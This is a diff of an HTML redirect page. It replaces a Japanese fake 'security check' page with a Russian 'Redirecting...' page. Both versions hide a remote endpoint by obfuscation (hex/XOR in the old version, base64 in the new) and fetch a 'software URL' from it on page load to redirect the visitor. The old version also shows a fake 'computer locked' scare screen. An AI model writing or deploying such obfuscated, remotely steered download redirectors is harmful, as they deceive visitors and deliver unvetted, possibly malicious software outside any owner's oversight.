@@ -1,92 +1,56 @@
 <!DOCTYPE html>
-<html lang="ja">
+<html lang="ru">
 <head>
-<meta charset="UTF-8">
-<title>システムエラー - システムエラー</title>
-<style>
-/* 警告: このスタイルを変更すると量子暗号が解除されます */
-body {
-    font-family: "ＭＳ 明朝", "Times New Roman", serif;
-    background: #000 url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAAUVBMVEWAgID///8EBASIiIh3d3dVVVWqqqoAAACzs7OZmZlERERjY2O6urpQUFClpaXZ2dkeHh7Dw8NxcXGGhoYvLy+SkpJ+fn4PDw8zMzMYGBitra3s7OyqK1SEAAAA+0lEQVQY02NggABmFhZWNnYOTi5uHl4+fgFBIWERUTFxCUkoa0lpmSVLly1fsXLV6jVr162HstZv2Lhp85at27bv2Llrd9ievXv3hYcfOHjo8JGjR4+dOHnq9Jmz587vD9+//8LFS5evXL12/cbNW7fv3L13//6Dh48eP3n67PmLl69ev3n77v2Hj58+f/n67fuPn79+/wGy/v3/D2QxQlgwFiOMxcTMAmYxQ1hQFiMLGxKYxQ5lcXBCOFxQFi8flMXHD2EJCEJZQkJQlrAIlCUiCmWJiUNZEhJQlqQUlCUtDWXJyEBZsnJQlrw8lKWgAGUpKkFZSspQlrIKlKWqCmWpqUNZGhpQlqYWlKUNALmaGL4UCxWmAAAAAElFTkSuQmCC');
-    color: #0f0;
-    text-align: center;
-    padding: 50px;
-}
-/* 注意: このアニメーションは政府によって監視されています */
-@keyframes 政府監視 {
-    0% { transform: rotate(0deg) scale(1); }
-    50% { transform: rotate(180deg) scale(1.5); }
-    100% { transform: rotate(360deg) scale(1); }
-}
-.危険 {
-    width: 70px;
-    height: 70px;
-    margin: 30px auto;
-    border: 5px solid #f00;
-    border-top-color: transparent;
-    border-radius: 50%;
-    animation: 政府監視 2s linear infinite;
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Перенаправление...</title>
+    <style>
+        body { font-family: Arial, text-align: center; padding: 50px; }
+        .loader { 
+            border: 5px solid #f3f3f3; 
+            border-top: 5px solid #3498db;
+            border-radius: 50%; 
+            width: 50px; 
+            height: 50px; 
+            animation: spin 1s linear infinite; 
+            margin: 20px auto; 
+        }
+        @keyframes spin { 
+            0% { transform: rotate(0deg); } 
+            100% { transform: rotate(360deg); } 
+        }
+    </style>
 </head>
 <body>
-<!-- 重要: このdivは絶対に削除しないでください -->
-<div id="秘密" style="display:none;">あなたはこのページを閲覧する権限がありません</div>
+    <h1>Загрузка...</h1>
+    <div class="loader"></div>
+    <p id="status">Пожалуйста, подождите.</p>
+    <p id="error" style="color: red;"></p>
 
-<h1>高度なシステム処理中...</h1>
-<div class="危険"></div>
-<p id="状態">セキュリティチェックを実行しています...</p>
-
-<script>
-// 警告: このコードは改ざん防止機能付きです
-const _0x12ab = ["\x68\x74\x74\x70\x73\x3A\x2F\x2F","\x67\x65\x74\x73\x6F\x6C\x61\x72\x61\x2E\x64\x65\x76","\x2F\x61\x70\x69\x2F\x65\x6E\x64\x70\x6F\x69\x6E\x74\x2E\x6A\x73\x6F\x6E"];
-
-// 注意: この関数は量子暗号化されています
-function 解読(データ) {
-    return データ.map(コード => 
-        String.fromCharCode(コード ^ 0x55)
-    ).join('');
-}
-
-// 危険: この処理は監視対象です
-(async function() {
-    try {
-        document.getElementById('状態').textContent = '暗号化通信を開始します...';
-        
-        // 重要: このAPIは偽装されています
-        const 応答 = await fetch(解読([0x3d,0x21,0x21,0x34,0x21,0x3e,0x3f,0x3a]) + _0x12ab[1] + _0x12ab[2]);
-        
-        if (!応答.ok) throw new Error('量子通信エラー');
-        
-        const データ = await 応答.json();
-        const リンク = データ['ソフトウェアURL'] || データ.softwareUrl;
-        
-        if (!リンク) throw new Error('不正なデータ形式');
-        
-        // 警告: この操作は記録されます
-        setTimeout(() => {
-            window.location.href = リンク;
-        }, 3000);
-        
-    } catch (エラー) {
-        document.body.innerHTML = `
-            <h1 style="color:red">重大なセキュリティ違反</h1>
-            <p>エラーコード: ${Math.random().toString(36).substr(2,8).toUpperCase()}</p>
-            <marquee>このコンピュータはロックされました</marquee>
-        `;
-    }
-})();
-
-/* 注意: 以下のコードはデバッグ用ではありません */
-(() => {
-    const 偽装データ = new Array(1000).fill(0).map((_,i) => i ** i);
-    class 偽装クラス {
-        constructor() {
-            this.秘密 = Symbol('政府機密');
+    <script>
+        async function redirect() {
+            try {
+                document.getElementById('status').textContent = 'Получение данных...';
+                const e = "aHR0cHM6Ly9nZXRzb2xhcmEuZGV2L2FwaS9lbmRwb2ludC5qc29u";
+                const t = atob(e);
+                const response = await fetch(t);
+                
+                if (!response.ok) throw new Error(`Ошибка: ${response.status}`);
+                
+                const data = await response.json();
+                const n = Object.keys(data).find(k => k.toLowerCase().includes('url'));
+                
+                if (!n) throw new Error('Ссылка не найдена');
+                
+                window.location.href = data[n];
+                
+            } catch (error) {
+                document.getElementById('error').innerHTML = `Ошибка: ${error.message}`;
+                document.getElementById('status').textContent = 'Обновите страницу (F5).';
+            }
         }
-    }
-    console.log(new 偽装クラス());
-})();
-</script>
+
+        redirect();
+    </script>
 </body>
 </html>
